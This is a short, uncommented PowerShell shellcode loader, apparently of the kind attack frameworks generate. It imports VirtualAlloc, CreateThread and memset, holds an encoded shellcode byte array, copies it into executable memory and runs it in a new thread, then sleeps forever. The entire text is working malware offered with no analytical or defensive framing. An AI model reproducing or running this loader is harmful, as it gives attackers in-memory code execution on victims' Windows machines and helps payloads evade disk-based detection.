$4TL = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $4TL -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x80,0x01,0xce,0x2c,0xdb,0xc8,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x31,0x78,0x13,0x03,0x78,0x13,0x83,0xe8,0x7c,0xe3,0x3b,0xd0,0x94,0x66,0xc3,0x29,0x64,0x07,0x4d,0xcc,0x55,0x07,0x29,0x84,0xc5,0xb7,0x39,0xc8,0xe9,0x3c,0x6f,0xf9,0x7a,0x30,0xb8,0x0e,0xcb,0xff,0x9e,0x21,0xcc,0xac,0xe3,0x20,0x4e,0xaf,0x37,0x83,0x6f,0x60,0x4a,0xc2,0xa8,0x9d,0xa7,0x96,0x61,0xe9,0x1a,0x07,0x06,0xa7,0xa6,0xac,0x54,0x29,0xaf,0x51,0x2c,0x48,0x9e,0xc7,0x27,0x13,0x00,0xe9,0xe4,0x2f,0x09,0xf1,0xe9,0x0a,0xc3,0x8a,0xd9,0xe1,0xd2,0x5a,0x10,0x09,0x78,0xa3,0x9d,0xf8,0x80,0xe3,0x19,0xe3,0xf6,0x1d,0x5a,0x9e,0x00,0xda,0x21,0x44,0x84,0xf9,0x81,0x0f,0x3e,0x26,0x30,0xc3,0xd9,0xad,0x3e,0xa8,0xae,0xea,0x22,0x2f,0x62,0x81,0x5e,0xa4,0x85,0x46,0xd7,0xfe,0xa1,0x42,0xbc,0xa5,0xc8,0xd3,0x18,0x0b,0xf4,0x04,0xc3,0xf4,0x50,0x4e,0xe9,0xe1,0xe8,0x0d,0x65,0xc5,0xc0,0xad,0x75,0x41,0x52,0xdd,0x47,0xce,0xc8,0x49,0xeb,0x87,0xd6,0x8e,0x0c,0xb2,0xaf,0x01,0xf3,0x3d,0xd0,0x08,0x37,0x69,0x80,0x22,0x9e,0x12,0x4b,0xb3,0x1f,0xc7,0xdc,0xe3,0x8f,0xb8,0x9c,0x53,0x6f,0x69,0x75,0xbe,0x60,0x56,0x65,0xc1,0xab,0xff,0x0c,0x3b,0x3b,0xc0,0x79,0x42,0xb1,0xa8,0x7b,0x45,0x23,0x50,0xf5,0xa3,0xc1,0xb1,0x53,0x7b,0x7d,0x2b,0xfe,0xf7,0x1c,0xb4,0xd4,0x7d,0x1e,0x3e,0xdb,0x82,0xd0,0xb7,0x96,0x90,0x84,0x37,0xed,0xcb,0x02,0x47,0xdb,0x66,0xaa,0xdd,0xe0,0x20,0xfd,0x49,0xeb,0x15,0xc9,0xd5,0x14,0x70,0x42,0xdf,0x80,0x3b,0x3c,0x20,0x45,0xbc,0xbc,0x76,0x0f,0xbc,0xd4,0x2e,0x6b,0xef,0xc1,0x30,0xa6,0x83,0x5a,0xa5,0x49,0xf2,0x0f,0x6e,0x22,0xf8,0x76,0x58,0xed,0x03,0x5d,0x58,0xd1,0xd5,0x9b,0x2e,0x3b,0xe6;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$sUpO=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($sUpO.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$sUpO,0,0,0);for (;;){Start-sleep 60};